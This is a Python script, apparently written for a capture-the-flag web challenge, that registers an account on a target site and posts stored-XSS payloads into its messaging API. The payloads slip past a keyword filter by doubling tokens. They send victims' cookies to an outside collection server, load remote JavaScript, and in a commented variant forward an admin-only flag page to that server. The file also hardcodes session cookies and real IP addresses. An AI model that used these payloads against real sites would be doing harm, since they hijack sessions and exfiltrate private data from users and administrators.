import requests as req
import sys

sys.path.append('/usr/local/lib/python2.7/site-packages')

headers = {
    # 'Cookie': 'PHPSESSID=xxxxx'
    'Cookie':"PHPSESSID=bgvo176v0fb7k0ur6ntiughn27"
}

url = 'http://52.80.63.91/'


def reg(x):
    res = req.post(url=url + 'register.php',
                   data={"user": x, "pass": x}, headers=headers)
    if res.status_code == 200 and 'register success' in res.content:
        return login(x)
    else:
        return False


def login(x):
    res = req.post(url=url + 'login.php',
                   data={"user": x, "pass": x}, headers=headers)
    if res.status_code == 200:
        return True
    else:
        return False


def fuck(x, payload):
    res = req.post(url=url + 'api/addmessage.php',
                   data={"to": x, "message": payload}, headers=headers)
    if res.status_code == 200 and 'add success' in res.content:
        return True
    else:
        return False


def get2():
    res = req.get(url=url + 'api/getmessage.php', headers=headers)
    if res.status_code == 200:
        print res.content

def get3():
    res = req.get(url=url + '/adminshigesha233e3333#admin', headers={"Cookie":"PHPSESSID=efph1p9snbvd5mmbtj8vfe7cf1"})
    if res.status_code == 200:
        print res.content

if __name__ == '__main__':
    xssplatform = '//115.159.196.171/pwnhub/getxss.php'
    xsspayload = '//115.159.196.171/pwnhub/x.js'
    user = 'virink'
    user = 'admin'
    # print reg(user)
    payload = """<scrscriptipt>window.locatioonn="%s?cookie="+escape(document.cookie)</scrscriptipt>""" % (xssplatform)
    # read html source code
    payload = """<scrscriptipt>window.locatioonn="/adminshigesha233e3333/#<scrscriptipt src='%s'"</scrscriptipt>""" % (xsspayload)
    # payload = """<scrscriptipt src="./static/js/jquery.min.js"></scrscriptipt>
    # <scrscriptipt>
    # $.get('/adminshigesha233e3333/flag.php',functioonn(res){window.locatioonn="%s?flag="+escape(res)}).fail(functioonn(){window.locatioonn="%s?flag=error"})
    # </scrscriptipt>""" % (xssplatform,xssplatform)
    print fuck(user,payload)
    # get2()
